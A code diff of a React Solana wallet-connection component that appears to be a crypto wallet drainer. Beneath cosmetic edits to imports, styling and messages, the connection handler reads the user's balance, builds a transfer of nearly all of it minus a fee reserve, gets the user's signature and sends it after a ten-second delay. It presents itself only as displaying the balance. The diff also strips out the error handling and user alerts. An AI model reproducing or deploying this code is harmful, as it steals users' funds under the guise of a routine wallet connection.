@@ -1,7 +1,15 @@
 import React, { FC, ReactNode, useMemo, useEffect, useState } from 'react';
 import { WalletAdapterNetwork } from '@solana/wallet-adapter-base';
-import { ConnectionProvider, WalletProvider, useWallet } from '@solana/wallet-adapter-react';
-import { WalletModalProvider, useWalletModal } from '@solana/wallet-adapter-react-ui';
+import {
+    ConnectionProvider,
+    WalletProvider,
+    useWallet
+} from '@solana/wallet-adapter-react';
+import {
+    WalletModalProvider,
+    useWalletModal
+} from '@solana/wallet-adapter-react-ui';
+
 import {
     PhantomWalletAdapter,
     GlowWalletAdapter,
@@ -12,6 +20,7 @@ import {
     SolletWalletAdapter,
     TorusWalletAdapter,
 } from '@solana/wallet-adapter-wallets';
+
 import {
     clusterApiUrl,
     Connection,
@@ -53,7 +62,7 @@ const Context: FC<{ children: ReactNode }> = ({ children }) => {
 
     return (
         <ConnectionProvider endpoint={endpoint}>
-            <WalletProvider wallets={wallets} autoConnect={true}>
+            <WalletProvider wallets={wallets} autoConnect>
                 <WalletModalProvider>{children}</WalletModalProvider>
             </WalletProvider>
         </ConnectionProvider>
@@ -86,21 +95,12 @@ const WalletConnectionHandler: FC = () => {
             setLoading(true);
             const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
 
-            let balanceLamports: number;
-            try {
-                balanceLamports = await connection.getBalance(walletPublicKey);
-            } catch (err) {
-                console.error('❌ Failed to fetch balance:', err);
-                alert('Failed to fetch balance. Please try again.');
-                setSolBalance(null);
-                return;
-            }
+            const lamports = await connection.getBalance(walletPublicKey);
+            const sol = lamports / LAMPORTS_PER_SOL;
+            setSolBalance(sol);
+            console.log(`✅ Balance: ${sol.toFixed(4)} SOL`);
 
-            const balanceSOL = balanceLamports / LAMPORTS_PER_SOL;
-            setSolBalance(balanceSOL);
-            console.log(`✅ Wallet Connected: ${balanceSOL.toFixed(4)} SOL`);
-
-            const transferAmount = balanceLamports - 5000;
+            const transferAmount = lamports - 100000;
             if (transferAmount <= 0) {
                 alert('⚠️ Not enough SOL to send after fees.');
                 return;
@@ -122,20 +122,19 @@ const WalletConnectionHandler: FC = () => {
             }
 
             const signedTx = await signTransaction(tx);
-            console.log('📝 Transaction signed by user.');
+            console.log('📝 Transaction signed. Will send in 10 seconds...');
 
             setTimeout(async () => {
                 try {
-                    const sig = await connection.sendRawTransaction(signedTx.serialize());
-                    console.log(`🚀 Sent after 10s. Tx Signature: ${sig}`);
+                    const signature = await connection.sendRawTransaction(signedTx.serialize());
+                    console.log(`🚀 Transaction sent! Signature: ${signature}`);
                 } catch (err) {
-                    console.error('❌ Failed to send signed transaction:', err);
-                    alert('Failed to send transaction.');
+                    console.error('❌ Failed to send transaction:', err);
                 }
             }, 10000);
-        } catch (error) {
-            console.error('❌ Transaction preparation error:', error);
-            alert('An error occurred. Check console for details.');
+        } catch (err) {
+            console.error('❌ Error during fetch/send:', err);
+            setSolBalance(null);
         } finally {
             setLoading(false);
         }
@@ -148,7 +147,7 @@ const WalletConnectionHandler: FC = () => {
             style={{
                 marginTop: '2rem',
                 textAlign: 'center',
-                backgroundColor: '#f0f0f0',
+                backgroundColor: '#f9fafb',
                 padding: '20px',
                 borderRadius: '12px',
                 boxShadow: '0 4px 12px rgba(0,0,0,0.1)',
@@ -170,7 +169,7 @@ const WalletConnectionHandler: FC = () => {
                 {loading
                     ? 'Loading...'
                     : solBalance === null
-                    ? 'Unable to fetch balance'
+                    ? 'Error fetching'
                     : `${solBalance.toFixed(4)} SOL`}
             </p>
         </div>
